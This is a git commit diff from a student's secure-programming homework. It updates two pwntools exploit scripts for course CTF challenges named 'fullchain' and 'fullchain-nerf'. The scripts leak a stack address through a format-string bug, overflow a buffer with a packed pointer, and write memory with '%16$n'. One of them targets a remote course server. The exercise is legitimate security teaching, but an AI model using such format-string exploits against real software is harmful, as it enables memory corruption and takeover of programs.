31c0ccbfd1c2bc770f0baef02fb6b495f555abb0
SimpsonChu <simpson880114@gmail.com>
2021-12-30 19:32:56 +0800

    add hw9 of sp

--- Secure_Programming/pwnbox/fullchain-nerf/share/fullchain-nerf.py
+++ Secure_Programming/pwnbox/fullchain-nerf/share/fullchain-nerf.py
@@ -1,17 +1,30 @@
 from pwn import *
 
 context.arch = 'amd64'
-context.terminal = ['tmux', 'splitw', '-h']
+# context.terminal = ['tmux', 'splitw', '-h']
 
 # r = remote('edu-ctf.zoolab.org', 30206)
 r = process('./fullchain-nerf')
+# print('hi')
+# gdb.attach(r)
+# print('hi')
+r.sendlineafter("global or local > ", b'local')
+print('hi')
+r.sendlineafter('set, read or write > ', b'write%7$p')
+print('hi')
+r.recvuntil(b'write')
+cnt = r.recvuntil('g')[:-1]
 
-gdb.attach(r)
+print(cnt)
+cnt_address = int(cnt.decode(), base = 16) + int(0x24)
+print(hex(cnt_address))
+r.sendlineafter("lobal or local > ", b'local')
+r.sendlineafter('set, read or write > ', b'read')
+
+r.sendafter('length > ', str(0x20).encode())
+r.sendline(b'a' * 16 + p64(cnt_address))
 
 r.sendafter("global or local > ", b'local\n')
-r.sendafter('set read or write > ', b'write%7$p\n')
-r.recvuntil('write')
-cnt_address = r.recvline()
-print(cnt_address)
+r.sendafter('set, read or write > ', b'write%16$n\n')
 
 r.interactive()
--- Secure_Programming/pwnbox/fullchain/share/fullchain.py
+++ Secure_Programming/pwnbox/fullchain/share/fullchain.py
@@ -3,24 +3,34 @@ from pwn import *
 context.arch = 'amd64'
 context.terminal = ['tmux', 'splitw', '-h']
 
-# r = remote('edu-ctf.zoolab.org', 30201)
-r = process('./fullchain')
+r = remote('edu-ctf.zoolab.org', 30201)
+# r = process('./fullchain')
+# gdb.attach(r)
 
-gdb.attach(r)
+r.sendafter('global or local > ', b'local\n')
+r.sendafter('set, read or write > ', b'write%7$p\n')
 
-r.sendafter("global or local > ", b'local\n')
-r.sendafter('set read or write > ', b'write%7$p\n')
 r.recvuntil('write')
-cnt_address = r.recvline()
-print(cnt_address)
-cnt_address = cnt_address[:-2]
-cnt_address = hex(int(cnt_address) + 36)
+cnt = r.recvuntil('g')[:-1]
+print(cnt)
+cnt_address = int(cnt.decode(), base = 16) - 12
+
+r.sendafter("lobal or local > ", b'local\n')
+r.sendafter('set, read or write > ', b'read\n')
+r.send(b'a' * 16 + p64(cnt_address))
 
 r.sendafter("global or local > ", b'local\n')
-r.sendafter('set read or write > ', b'read\n')
-r.sendafter('length > ', str(0x20).encode())
-r.send(cnt_address)
+r.sendafter('set, read or write > ', b'write%16$n\n')
 
+# r.sendafter('global or local > ', b'local\n')
+# r.sendafter('set, read or write > ', b'write%7$p\n')
+# r.sendafter('global or local > ', b'local\n')
+# r.sendafter('set, read or write > ', b'write%7$p\n')
+# r.sendafter('global or local > ', b'local\n')
+# r.sendafter('set, read or write > ', b'write%7$p\n')
+# r.sendafter('global or local > ', b'local\n')
+# r.sendafter('set, read or write > ', b'write%7$p\n')
+# r.sendafter('global or local > ', b'local\n')
+# r.sendafter('set, read or write > ', b'write%7$p\n')
 
 r.interactive()
-0x7ffe6eff5ab4
